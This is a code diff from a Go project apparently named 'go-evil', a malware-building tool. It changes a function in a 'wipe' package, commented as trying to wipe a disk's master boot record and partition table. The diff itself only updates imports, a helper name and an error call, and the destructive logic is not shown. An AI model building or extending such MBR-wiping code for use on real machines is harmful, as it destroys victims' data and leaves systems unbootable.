@@ -3,11 +3,11 @@ package wipe
 import (
 	"fmt"
 
-	"github.com/s9rA16Bf4/Go-tools/tools"
+	tools "github.com/s9rA16Bf4/Go-tools"
 	"github.com/s9rA16Bf4/go-evil/utility/structure"
 	"github.com/s9rA16Bf4/go-evil/utility/structure/functions"
 	"github.com/s9rA16Bf4/go-evil/utility/structure/json"
-	"github.com/s9rA16Bf4/notify_handler/go/notify"
+	notify "github.com/s9rA16Bf4/notify_handler"
 )
 
 // Tries to wipe the mbr
@@ -17,11 +17,11 @@ func Mbr(value string, data_object *json.Json_t) []string {
 	arr := structure.Create_evil_object(value)
 
 	if arr.Length() != 2 {
-		notify.Error(fmt.Sprintf("Obtained evil array had size %d, but 2 was requested", arr.Length()), "system.move()")
+		notify.Error(fmt.Sprintf("Obtained evil array had size %d, but 2 was requested", arr.Length()), "system.move()", 1)
 	}
 
 	device := arr.Get(0)
-	wipe_partition_table := tools.String_to_boolean(arr.Get(1))
+	wipe_partition_table := tools.StringToBoolean(arr.Get(1))
 
 	data_object.Add_go_function(functions.Go_func_t{Name: function_call, Func_type: "", Part_of_struct: "", Return_type: "",
 		Parameters: []string{"repr_1 []int", "repr_2 bool"},
